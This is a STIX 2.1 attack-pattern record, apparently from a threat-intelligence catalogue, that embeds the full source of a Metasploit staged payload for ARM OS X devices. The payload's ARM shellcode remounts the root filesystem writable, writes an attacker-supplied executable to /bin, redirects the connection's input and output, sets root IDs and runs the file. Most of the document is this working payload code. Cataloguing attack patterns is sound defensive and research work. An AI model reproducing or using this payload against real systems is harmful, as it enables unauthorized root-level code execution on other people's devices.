{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--767809be-367e-444f-b70e-ddb0e45ca1e1",
    "created": "2024-08-14T16:33:19.24871Z",
    "modified": "2024-08-14T16:33:19.248714Z",
    "name": "OS X Write and Execute Binary",
    "description": "Spawn a command shell (staged)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/osx/armle/execute.rb",
            "external_id": "execute.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'OS X Write and Execute Binary',\n      'Description'   => 'Spawn a command shell (staged)',\n      'Author'        => 'hdm',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_ARMLE,\n      'Session'       => Msf::Sessions::CommandShell,\n      'Stage'         =>\n        {\n          'Payload' =>\n            [\n              # vfork\n              0xe3a0c042, # mov r12, #0x42\n              0xe0200000, # eor r0, r0, r0\n              0xef000080, # swi 128\n              0xe3500000, # cmp r0, #0x0\n              0x0a000017, # beq _exit\n\n              # remount root filesystem rw\n              0xe3a0c0a7, # mov r12, #0xa7\n              0xe28f0010, # add r0, pc, #0x10\n              0xe28f1010, # add r1, pc, #0x10\n              0xe28f3010, # add r3, pc, #0x10\n              0xe0202000, # eor r2, r0, r0\n              0xef000080, # swi 128\n              0xea000002, # b get_filename\n\n              # \"hfs\"\n              0x00736668, # rsbeqs r6, r3, r8, ror #12\n              # \"/\"\n              0x0000002f, # andeq r0, r0, pc, lsr #32\n              # NULL\n              0x00000000, # andeq r0, r0, r0\n\n              # get file name\n              0xeb000007, # bl unlink_file\n\n              # executable file name (/bin/msf_stage_xxxxxxxxxx.bin)\n              0x6e69622f,\n              0x66736d2f,\n              0x6174735f,\n              0x785f6567,\n              0x78787878,\n              0x78787878,\n              0x6e69622e,\n              0x00000000,\n\n              # unlink file\n              0xe1a0900e, # mov r9, lr\n              0xe3a0c00a, # mov r12, #0xa\n              0xe1a0000e, # mov r0, lr\n              0xef000080, # swi 128\n\n              # open file\n              0xe3a0c005, # mov r12, #0x5\n              0xe1a00009, # mov r0, r9\n              0xe59f100c, # ldr r1, [pc, #12] ;[0x00001ed4] = 0x00000602\n              0xe59f200c, # ldr r2, [pc, #12] ;[0x00001ed8] = 0x000001ed\n              0xef000080, # swi 128\n              0xe1a08000, # mov r8, r0\n              0xea000001, # b get_data_pointer_a\n\n              # open file parameters\n              0x00000602, # READ_WRITE / TRUNC / CREATE\n              0x000001ed, # 0755\n\n              # get embedded data pointer\n              0xea000020, # b get_embedded_data\n\n              # write file\n              0xe3a0c004, # mov r12, #0x4\n              0xe1a00008, # mov r0, r8\n              0xe28e1004, # add r1, lr, #0x4\n              0xe49e2000, # ldr r2, [lr], #0\n              0xef000080, # swi 128\n\n              # close file\n              0xe3a0c006, # mov r12, #0x6\n              0xe1a00008, # mov r0, r8\n              0xef000080, # swi 128\n\n              # setup dup\n              0xe3a05002, # mov r5, #0x2\n\n              # dup2\n              0xe3a0c05a, # mov r12, #0x5a\n              0xe1a0000a, # mov r0, r10\n              0xe1a01005, # mov r1, r5\n              0xef000080, # swi 128\n              0xe2455001, # sub r5, r5, #0x1\n              0xe3550000, # cmp r5, #0x0\n              0xaafffff8, # bge dup2\n\n              # setreuid(0,0)\n              0xe3a00000, # mov r0, #0x0\n              0xe3a01000, # mov r1, #0x0\n              0xe3a0c07e, # mov r12, #0x7e\n              0xef000080, # swi 128\n\n              # execve\n              0xe0455005, # sub r5, r5, r5\n              0xe1a0600d, # mov r6, sp\n              0xe24dd020, # sub sp, sp, #0x20\n              0xe1a00009, # mov r0, r9\n              0xe4860000, # str r0, [r6], #0\n              0xe5865004, # str r5, [r6, #4]\n              0xe1a01006, # mov r1, r6\n              0xe3a02000, # mov r2, #0x0\n              0xe3a0c03b, # mov r12, #0x3b\n              0xef000080, # swi 128\n\n              # exit(0)\n              0xe0200000, # eor r0, r0, r0\n              0xe3a0c001, # mov r12, #0x1\n              0xef000080, # swi 128\n\n              # bounce back up\n              0xebffffdd  # bl get_data_pointer_b\n\n              # executable length value\n              # executable data\n            ].pack(\"V*\")\n        }\n      ))\n    register_options(\n      [\n        OptPath.new('PEXEC', [ true, \"Full path to the file to execute\",\n          File.join(Msf::Config.data_directory, \"ipwn\", \"ipwn\")])\n      ])\n  end\n\n  def generate_stage(opts={})\n    data = super(opts)\n\n    begin\n      print_status(\"Reading executable file #{datastore['PEXEC']}...\")\n      buff = ::File.binread(datastore['PEXEC'])\n      data << [buff.length].pack(\"V\")\n      data << buff\n      print_status(\"Read #{buff.length} bytes...\")\n    rescue\n      print_error(\"Failed to read executable: #{$!}\")\n      return\n    end\n\n    if(data.length > (1024*1024*8))\n      print_error(\"The executable and stage must be less than 8Mb\")\n      return\n    end\n\n    temp = Rex::Text.rand_text_alphanumeric(9)\n    data.gsub(\"msf_stage_xxxxxxxxx.bin\", \"msf_stage_#{temp}.bin\")\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}